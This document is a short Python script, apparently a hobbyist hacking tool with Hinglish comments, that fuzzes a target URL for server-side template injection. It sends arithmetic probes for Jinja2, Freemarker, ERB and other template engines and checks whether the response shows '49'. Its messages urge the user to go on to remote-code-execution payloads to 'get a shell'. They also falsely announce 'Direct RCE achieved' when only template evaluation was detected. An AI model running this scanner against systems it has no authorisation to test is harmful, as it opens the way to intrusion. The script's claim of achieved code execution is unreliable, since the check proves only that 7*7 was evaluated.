import requests
import sys
import time

def scan_ssti(target_url):
    print(f"\n[*] Bhai, starting The Template Terminator: SSTI Hunter...")
    print(f"[*] Target Parameter injected at -> {target_url}\n")
    print("==================================================")

    # The Hacker's SSTI Math Dictionary
    # Alag-alag template engines alag syntax use karte hain. Sabka target hai: 7*7 = 49
    ssti_payloads = {
        "Jinja2/Twig (Python/PHP)": "{{7*7}}",
        "Smarty (PHP)": "{7*7}",
        "Freemarker (Java)": "${7*7}",
        "Pug/Jade (Node.js)": "#{7*7}",
        "EJS/Ruby/ERB": "<%= 7*7 %>",
        "Velocity (Java)": "#set($c=7*7)$c",
        "Tornado (Python)": "{% set x=7*7 %}{{x}}"
    }

    found_vuln = False

    print("[*] Firing Polyglot Math Payloads to detect Code Execution...\n")

    for engine, payload in ssti_payloads.items():
        # URL mein jahan FUZZ likha hai, wahan apna payload daalo
        attack_url = target_url.replace("FUZZ", payload)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) SSTI-Terminator/1.0"
        }

        try:
            # Send the request
            response = requests.get(attack_url, headers=headers, timeout=5)
            text = response.text
            
            print(f"[*] Testing {engine} payload: {payload}")

            # The Magic Check: Did the server evaluate our math?
            # If the literal payload string is NOT in the response, but "49" IS in the response!
            if payload not in text and "49" in text:
                print(f"\n   [!!!] JACKPOT 🎯 CRITICAL SSTI VULNERABILITY FOUND!")
                print(f"   [!!!] Vulnerable Engine: {engine}")
                print(f"   [!!!] The server evaluated 7*7 as 49!")
                print(f"   [!!!] Next Step: Search PayloadAllTheThings for '{engine} RCE payload' to get a shell!\n")
                found_vuln = True
                break # Agar ek mil gaya, toh baaki check karne ki zaroorat nahi
            
            time.sleep(0.5)

        except requests.exceptions.RequestException:
             print(f"   [!] Connection Error while testing {engine}.")

    print("==================================================")
    if found_vuln:
        print("[+] Scan Complete! Found a Critical Server-Side Template Injection. Direct RCE achieved! 💀💸")
    else:
        print("[-] Scan Complete. Server is securely rendering the text without evaluating it.")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(sys.argv) != 2:
        print("Usage: python3 ssti_fuzzer.py <Target_URL_with_FUZZ>")
        print("Example: python3 ssti_fuzzer.py 'http://target.com/profile?name=FUZZ'")
        sys.exit(1)
        
    url = sys.argv[1]
    
    if "FUZZ" not in url:
        print("[-] ERROR: Target URL must contain the word 'FUZZ' where the SSTI payload should go.")
        sys.exit(1)
        
    scan_ssti(url)
